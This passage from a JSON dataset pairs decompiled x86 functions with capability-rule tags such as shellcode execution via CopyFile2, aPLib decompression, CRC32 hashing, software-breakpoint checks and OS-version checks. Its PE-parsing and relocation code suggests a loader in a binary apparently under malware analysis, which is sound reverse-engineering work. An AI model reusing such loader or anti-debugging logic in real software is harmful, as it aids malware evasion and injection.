        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00439b7f(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00432cc2();\n    var_14h = 0;\n    if (*0x46a308 == 0) {\n        iVar1 = (**0x440068)(0x44baf0);\n        pcVar6 = *0x44001c;\n        if ((iVar1 == 0) || (iVar2 = (**0x44001c)(iVar1, 0x44bae4),  pcVar4 = *0x4400a0,  iVar2 == 0))\n        goto code_r0x00439cdc;\n        *0x46a308 = (**0x4400a0)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x44bad4);\n        *0x46a30c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x44bac0);\n        *0x46a310 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x44baa4);\n        *0x46a318 = (*pcVar4)(uVar3);\n        if (*0x46a318 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x44ba8c);\n            *0x46a314 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = *0x4400a4;\n    if ((*0x46a314 == var_18h) || (*0x46a318 == var_18h)) {\ncode_r0x00439c8b:\n        if ((((*0x46a30c != var_18h) && (pcVar4 = (*pcVar6)(*0x46a30c),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x46a310 != var_18h && (pcVar4 = (*pcVar6)(*0x46a310),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (**0x4400a4)(*0x46a314);\n        pcVar5 = (*pcVar6)(*0x46a318);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00439c8b;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x46a308);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x00439cdc:\n    fcn.0042ad2a(unaff_EBX);\n    return;\n}\n",
        "token_count": 914
    },
    "0043affd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043affd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042be61(arg_10h);\n    var_14h = fcn.0043cf1f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043c47d(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043b056:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043b096;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043b088:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043b096;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043b088;\n        goto code_r0x0043b056;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043b096:\n    fcn.0042ad2a(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0043b0a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043b0a5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042be61(arg_10h);\n    var_14h = fcn.0043cf1f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0043c9ce(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043b0fe:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043b13e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0043b130:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043b13e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0043b130;\n        goto code_r0x0043b0fe;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043b13e:\n    fcn.0042ad2a(unaff_EBX);\n    return;\n}\n",
        "token_count": 512
    },
    "00405200": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405200(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *unaff_ESI;\n    \n    iVar2 = (*arg_8h)();\n    if (iVar2 == 0) {\n        return true;\n    }\n    if ((*unaff_ESI != 0x5a4d) || (*(unaff_ESI + 0x1e) == 0)) {\n        return 2;\n    }\n    iVar2 = (*arg_8h)(unaff_ESI + 0x20, *(unaff_ESI + 0x1e), 0xf8, arg_ch);\n    if (iVar2 == 0) {\n        return true;\n    }\n    if (((*(unaff_ESI + 0x20) == 0x4550) && (unaff_ESI[0x2c] == 0x10b)) && (unaff_ESI[0x23] != 0)) {\n        iVar2 = unaff_ESI[0x23] * 0x28;\n        *(unaff_ESI + 0xa0) = iVar2;\n        iVar3 = fcn.0042ae6b(iVar2);\n        *(unaff_ESI + 0x9c) = iVar3;\n        if (iVar3 == 0) {\n            return 3;\n        }\n        iVar1 = unaff_ESI[0x2a] + 0x18 + *(unaff_ESI + 0x1e);\n        *(unaff_ESI + 0x9e) = iVar1;\n        iVar2 = (*arg_8h)(iVar3, iVar1, iVar2, arg_ch);\n        return iVar2 == 0;\n    }\n    return 2;\n}\n",
        "token_count": 405
    },
    "00405440": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405440(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x74);\n    if (*(arg_8h + 0x144) == iVar2) {\n        return 0;\n    }\n    if ((*(arg_8h + 0xe0) != 0) && (*(arg_8h + 0xe4) != 0)) {\n        iVar3 = *(arg_8h + 0x144);\n        piVar6 = iVar3 + *(arg_8h + 0xe0);\n        piVar1 = *(arg_8h + 0xe4) + -8 + piVar6;\n        do {\n            if (piVar1 <= piVar6) {\n                return 0;\n            }\n            uVar8 = piVar6[1] - 8U >> 1;\n            piVar9 = piVar6 + 2;\n            uVar7 = 0;\n            if (uVar8 != 0) {\n                do {\n                    uVar4 = *piVar9 >> 0xc;\n                    if (uVar4 != 0) {\n                        if (uVar4 != 3) {\n                            return 5;\n                        }\n                        piVar5 = (*piVar9 & 0xfff) + *piVar6 + *(arg_8h + 0x144);\n                        *piVar5 = *piVar5 + (iVar3 - iVar2);\n                    }\n                    uVar7 = uVar7 + 1;\n                    piVar9 = piVar9 + 2;\n                } while (uVar7 < uVar8);\n            }\n            piVar6 = piVar6 + piVar6[1];\n        } while( true );\n    }\n    return 4;\n}\n",
        "token_count": 477
    },
    "00405b70": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00405b70(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    uint auStack44 [3];\n    uint32_t var_28h;\n    uint uStack28;\n    uint *puStack24;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43dca0;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x456900 ^ &var_ch_3;\n    var_1ch = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = param_1[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack60;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.0042b9b1(uVar5 + 1),  puVar2 = var_1ch,  arg_8h == NULL)) {\n        uStack28 = 0;\n        fcn.0042b329(&uStack28);\n        auStack44[0] = 0x4453c4;\n        fcn.0042ba31(auStack44, 0x44c830);\n        var_28h = var_4h;\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        var_1ch = &stack0xffffffb8;\n        fcn.00405b20(var_4h + 1);\n        return 0x405046;\n    }\n    var_1ch = puVar2;\n    if (param_3 != 0) {\n        arg_ch = param_1;\n        if (0xf < param_1[5]) {\n            arg_ch = *param_1;\n        }\n        fcn.0042af40(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < param_1[5]) {\n        fcn.0042ac49();\n    }\n    *param_1 = 0;\n    *param_1 = arg_8h;\n    param_1[5] = uVar5;\n    param_1[4] = param_3;\n    if (0xf < uVar5) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 852
    },
    "00406850": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00406850(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t **arg_1ch, \n            uint32_t *arg_20h, int32_t arg_24h, uint32_t *arg_28h, uint32_t *arg_2ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_114h;\n    uint32_t **var_d8h;\n    uint32_t **var_d4h;\n    int32_t var_d0h;\n    uint32_t var_cch;\n    int32_t var_c8h;\n    uint32_t *var_c4h;\n    uint32_t *var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint32_t var_b4h;\n    uint32_t var_b0h;\n    uint32_t var_ach;\n    uint32_t *var_a8h;\n    uint32_t var_a4h;\n    uint32_t var_a0h;\n    uint32_t var_9ch;\n    uint32_t *var_98h;\n    int32_t var_94h;\n    uint32_t *var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t aiStack128 [14];\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_c8h = arg_24h;\n    var_c0h = arg_2ch;\n    var_98h = arg_8h;\n    var_b0h = arg_ch;\n    var_d4h = arg_1ch;\n    var_c4h = arg_28h;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_34h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    uVar6 = arg_ch;\n    do {\n        (&var_44h)[*arg_8h] = (&var_44h)[*arg_8h] + 1;\n        arg_8h = arg_8h + 1;\n        uVar6 = uVar6 - 1;\n    } while (uVar6 != 0);\n    if (var_44h == arg_ch) {\n        *arg_1ch = NULL;\n        *arg_20h = 0;\n        fcn.0042ad2a(var_114h);\n        return;\n    }\n    var_88h = *arg_20h;\n    var_8ch = 1;\n    do {\n        if ((&var_44h)[var_8ch] != 0) break;\n        var_8ch = var_8ch + 1;\n    } while (var_8ch < 0x10);\n    if (var_88h < var_8ch) {\n        var_88h = var_8ch;\n    }\n    var_a4h = 0xf;\n    do {\n        if ((&var_44h)[var_a4h] != 0) break;\n        var_a4h = var_a4h - 1;\n    } while (var_a4h != 0);\n    if (var_a4h < var_88h) {\n        var_88h = var_a4h;\n    }\n    iVar8 = 1 << (var_8ch & 0x1f);\n    *arg_20h = var_88h;\n    for (uVar6 = var_8ch; uVar6 < var_a4h; uVar6 = uVar6 + 1) {\n        if (iVar8 - (&var_44h)[uVar6] < 0) goto code_r0x00406a69;\n        iVar8 = (iVar8 - (&var_44h)[uVar6]) * 2;\n    }\n    var_a0h = var_a4h * 4;\n    iVar7 = (&var_44h)[var_a4h];\n    var_d0h = iVar8 - iVar7;\n    if (-1 < var_d0h) {\n        (&var_44h)[var_a4h] = iVar7 + var_d0h;\n        iVar8 = 0;\n        iVar7 = var_a4h - 1;\n        var_80h = 0;\n        if (iVar7 != 0) {\n            iVar9 = 0;\n            do {\n                iVar8 = iVar8 + *(&var_40h + iVar9);\n                iVar7 = iVar7 + -1;\n                *(aiStack128 + iVar9) = iVar8;\n                iVar9 = iVar9 + 4;\n            } while (iVar7 != 0);\n        }\n        uVar6 = 0;\n        do {\n            uVar3 = *var_98h;\n            var_98h = var_98h + 1;\n            var_90h = var_98h;\n            if (uVar3 != 0) {\n                iVar8 = (&var_84h)[uVar3];\n                arg_2ch[iVar8] = uVar6;\n                (&var_84h)[uVar3] = iVar8 + 1;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < arg_ch);\n        var_b0h = (&var_84h)[var_a4h];\n        var_90h = arg_2ch;\n        uVar6 = 0;\n        iVar8 = -var_88h;\n        var_ach = 0;\n        var_84h = 0;\n        var_94h = -1;\n        var_114h = 0;\n        var_98h = NULL;\n        var_a0h = 0;\n        if (var_8ch <= var_a4h) {\n            var_a8h = &var_44h + var_8ch;\n            uVar3 = var_88h;\n            do {\n                uVar2 = *var_a8h;\n                while (uVar2 != 0) {\n                    var_9ch = uVar2 - 1;\n                    if (iVar8 + uVar3 < var_8ch) {\n                        var_bch = iVar8 - uVar3;\n                        var_cch = uVar2;\n                        iVar7 = iVar8 + uVar3;\n                        do {\n                            iVar8 = iVar7;\n                            var_bch = var_bch + uVar3;\n                            var_94h = var_94h + 1;\n                            uVar6 = var_a4h - iVar8;\n                            if (var_88h < var_a4h - iVar8) {\n                                uVar6 = var_88h;\n                            }\n                            uVar3 = var_8ch - iVar8;\n                            uVar2 = 1 << (uVar3 & 0x1f);\n                            if ((var_cch < uVar2) && (iVar7 = uVar2 + (-1 - var_9ch),  puVar4 = var_a8h,  uVar3 < uVar6)\n                               ) {\n                                while (uVar3 = uVar3 + 1,  uVar3 < uVar6) {\n                                    var_98h = puVar4 + 1;\n                                    if (iVar7 * 2 <= *var_98h) break;\n                                    iVar7 = iVar7 * 2 - *var_98h;\n                                    puVar4 = var_98h;\n                                }\n                            }\n                            var_a0h = 1 << (uVar3 & 0x1f);\n                            uVar6 = var_a0h + *var_c4h;\n                            if (0x5a0 < uVar6) goto code_r0x00406a69;\n                            var_98h = var_c8h + *var_c4h * 8;\n                            var_d8h = &var_114h + var_94h;\n                            (&var_114h)[var_94h] = var_98h;\n                            *var_c4h = uVar6;\n                            if (var_94h == 0) {\n                                *var_d4h = var_98h;\n                            }\n                            else {\n                                (&var_84h)[var_94h] = var_ach;\n                                uVar6 = var_ach >> (var_bch & 0x1f);\n                                puVar4 = var_d8h[-1];\n                                var_b8h = var_b8h & 0xffff0000 | CONCAT11(var_88h, uVar3);\n                                var_b4h = (var_98h - puVar4 >> 3) - uVar6;\n                                puVar4[uVar6 * 2] = var_b8h;\n                                puVar4[uVar6 * 2 + 1] = var_b4h;\n                            }\n                            iVar7 = iVar8 + var_88h;\n                            uVar3 = var_88h;\n                            uVar6 = var_ach;\n                        } while (iVar8 + var_88h < var_8ch);\n                    }\n                    cVar1 = var_8ch;\n                    uVar5 = iVar8;\n                    if (var_90h < var_c0h + var_b0h) {\n                        var_b4h = *var_90h;\n                        if (var_b4h < arg_10h) {\n                            var_b8h._0_1_ = (-(var_b4h < 0x100) & 0xa0U) + 0x60;\n                        }\n                        else {\n                            iVar7 = (var_b4h - arg_10h) * 4;\n                            var_b8h._0_1_ = *(iVar7 + arg_18h) + 'P';\n                            var_b4h = *(iVar7 + arg_14h);\n                        }\n                        var_90h = var_90h + 1;\n                    }\n                    else {\n                        var_b8h._0_1_ = -0x40;\n                    }\n                    var_b8h = CONCAT31(CONCAT21(var_b8h._2_2_, cVar1 - uVar5), var_b8h);\n                    iVar7 = 1 << (cVar1 - uVar5 & 0x1f);\n                    uVar3 = uVar6 >> (uVar5 & 0x1f);\n                    if (uVar3 < var_a0h) {\n                        puVar4 = var_98h + uVar3 * 2;\n                        do {\n                            *puVar4 = var_b8h;\n                            puVar4[1] = var_b4h;\n                            uVar3 = uVar3 + iVar7;\n                            puVar4 = puVar4 + iVar7 * 2;\n                            uVar6 = var_ach;\n                        } while (uVar3 < var_a0h);\n                    }\n                    uVar2 = 1 << (cVar1 - 1U & 0x1f);\n                    uVar3 = uVar6 & uVar2;\n                    while (uVar3 != 0) {\n                        uVar6 = uVar6 ^ uVar2;\n                        uVar2 = uVar2 >> 1;\n                        uVar3 = uVar6 & uVar2;\n                    }\n                    uVar6 = uVar6 ^ uVar2;\n                    var_ach = uVar6;\n                    uVar2 = var_9ch;\n                    uVar3 = var_88h;\n                    if (((1 << (uVar5 & 0x1f)) - 1U & uVar6) != (&var_84h)[var_94h]) {\n                        do {\n                            iVar8 = iVar8 - var_88h;\n                            var_94h = var_94h + -1;\n                        } while (((1 << (iVar8 & 0x1f)) - 1U & uVar6) != (&var_84h)[var_94h]);\n                    }\n                }\n                var_a8h = var_a8h + 1;\n                var_8ch = var_8ch + 1;\n                var_9ch = uVar2;\n            } while (var_8ch <= var_a4h);\n        }\n        fcn.0042ad2a(var_114h);\n        return;\n    }\ncode_r0x00406a69:\n    fcn.0042ad2a(var_114h);\n    return;\n}\n",
        "token_count": 3035
    },
    "00412b60": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00412b60(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack56;\n    uint auStack40 [3];\n    uint var_24h;\n    uint *puStack24;\n    uint32_t *puStack20;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43e580;\n    var_18h = *in_FS_OFFSET;\n    uStack56 = *0x456900 ^ &var_ch_3;\n    puStack20 = &uStack56;\n    *in_FS_OFFSET = &var_18h;\n    uVar5 = var_4h | 7;\n    uVar6 = var_4h;\n    if (uVar5 < 0x7fffffff) {\n        uVar1 = param_1[5];\n        uVar4 = uVar1 >> 1;\n        uVar6 = uVar5;\n        if ((uVar5 / 3 < uVar4) && (uVar6 = uVar4 + uVar1,  0x7ffffffe - uVar4 < uVar1)) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    arg_8h = NULL;\n    uVar5 = uVar6 + 1;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack56;\n    if ((uVar5 != 0) &&\n       ((puVar2 = &uStack56,  0x7fffffff < uVar5 ||\n        (arg_8h = fcn.0042b9b1(uVar5 * 2),  puVar2 = puStack20,  arg_8h == NULL)))) {\n        puStack20 = puVar2;\n        var_24h = 0;\n        fcn.0042b329(&var_24h);\n        auStack40[0] = 0x4453c4;\n        fcn.0042ba31(auStack40, 0x44c830);\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        puStack20 = &stack0xffffffbc;\n        fcn.00412a70(var_4h + 1);\n        return 0x41203d;\n    }\n    puStack20 = puVar2;\n    puVar3 = arg_8h;\n    if (param_3 != 0) {\n        puVar3 = param_1;\n        if (7 < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        puVar3 = fcn.0042af40(arg_8h, puVar3, param_3 * 2);\n    }\n    if (7 < param_1[5]) {\n        puVar3 = fcn.0042ac49();\n    }\n    *param_1 = arg_8h;\n    param_1[5] = uVar6;\n    param_1[4] = param_3;\n    if (7 < uVar6) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3 * 2) = 0;\n    *in_FS_OFFSET = var_18h;\n    return puVar3;\n}\n",
        "token_count": 891
    },
    "0041df40": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041df40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    \n    iVar1 = *in_ECX;\n    uVar3 = (in_ECX[1] - iVar1) / 0x1c;\n    if (0x9249249U - arg_8h < uVar3) {\n        arg_8h = fcn.0042a14e(0x4453e8);\n        in_ECX = extraout_ECX;\n    }\n    uVar3 = uVar3 + arg_8h;\n    uVar2 = (in_ECX[2] - iVar1) / 0x1c;\n    if (uVar2 < uVar3) {\n        if (0x9249249 - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.0041de20(uVar2);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00423e30": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuchar * __cdecl\nfcn.00423e30(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f6d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    uVar1 = fcn.0042b420(puVar2, uVar1);\n    if (uVar1 % 3 != 0) {\n        uVar1 = (uVar1 - uVar1 % 3) + 3;\n    }\n    arg_8h_00 = fcn.0042ae6b((uVar1 * 8) / 6 + 1);\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    uVar3 = arg_8h_00;\n    arg_ch_00 = fcn.0042b420(puVar2);\n    fcn.00420d20(puVar2, arg_ch_00, uVar3);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    uVar3 = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, uVar3);\n    if (0xf < arg_20h) {\n        fcn.0042ac49(arg_ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 520
    },
    "004261a0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004261a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t *piVar6;\n    uint16_t *puVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = arg_8h;\n    *(arg_8h + 0x1f2c + *(arg_8h + 0x1af2c)) = arg_10h;\n    *(arg_8h + 0x1af2c) = *(arg_8h + 0x1af2c) + 1;\n    if (arg_ch == 0) {\n        piVar3 = arg_8h + 0x14 + arg_10h * 4;\n        *piVar3 = *piVar3 + 1;\n    }\n    else {\n        piVar3 = arg_8h + 0x418 + *(arg_8h + 0x1b3d + arg_10h) * 4;\n        *piVar3 = *piVar3 + 1;\n        arg_ch = arg_ch + -1;\n        if (arg_ch < 0x100) {\n            uVar5 = *(arg_8h + 0x1c3d + arg_ch);\n        }\n        else {\n            uVar5 = *((arg_ch >> 7) + 0x1d3d + arg_8h);\n        }\n        piVar3 = arg_8h + 0x908 + uVar5 * 4;\n        *piVar3 = *piVar3 + 1;\n        *(arg_8h + 0x9f2c + *(arg_8h + 0x1af30) * 2) = arg_ch;\n        *(arg_8h + 0x1af30) = *(arg_8h + 0x1af30) + 1;\n        *(arg_8h + 0x1af38) = *(arg_8h + 0x1af38) | *(arg_8h + 0x1af39);\n    }\n    *(arg_8h + 0x1af39) = *(arg_8h + 0x1af39) << 1;\n    if ((*(arg_8h + 0x1af2c) & 7) == 0) {\n        *(*(arg_8h + 0x1af34) + 0x19f2c + arg_8h) = *(arg_8h + 0x1af38);\n        *(arg_8h + 0x1af34) = *(arg_8h + 0x1af34) + 1;\n        *(arg_8h + 0x1af38) = 0x100;\n    }\n    if ((2 < *(arg_8h + 4)) && ((*(arg_8h + 0x1af2c) & 0xfff) == 0)) {\n        iVar8 = *(arg_8h + 0x1af2c) * 8;\n        piVar1 = arg_8h + 0x6af84;\n        piVar2 = arg_8h + 0x6af74;\n        arg_10h = 0;\n        arg_8h = 0;\n        piVar6 = 0x4482a4;\n        puVar7 = iVar4 + 0x90c;\n        do {\n            iVar8 = iVar8 + puVar7[-2] * (piVar6[-1] + 5);\n            arg_8h = arg_8h + (*piVar6 + 5) * *puVar7;\n            arg_10h = arg_10h + puVar7[2] * (piVar6[1] + 5);\n            piVar6 = piVar6 + 3;\n            puVar7 = puVar7 + 6;\n        } while (piVar6 < 0x44831c);\n        if ((*(iVar4 + 0x1af30) < *(iVar4 + 0x1af2c) >> 1) &&\n           ((iVar8 + arg_8h + arg_10h >> 2 & 0x3ffffffe) < (*piVar1 - *piVar2 & 0xfffffffeU))) {\n            return 1;\n        }\n    }\n    if ((*(iVar4 + 0x1af2c) != 0x7fff) && (*(iVar4 + 0x1af30) != 0x8000)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1072
    },
    "004077a0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
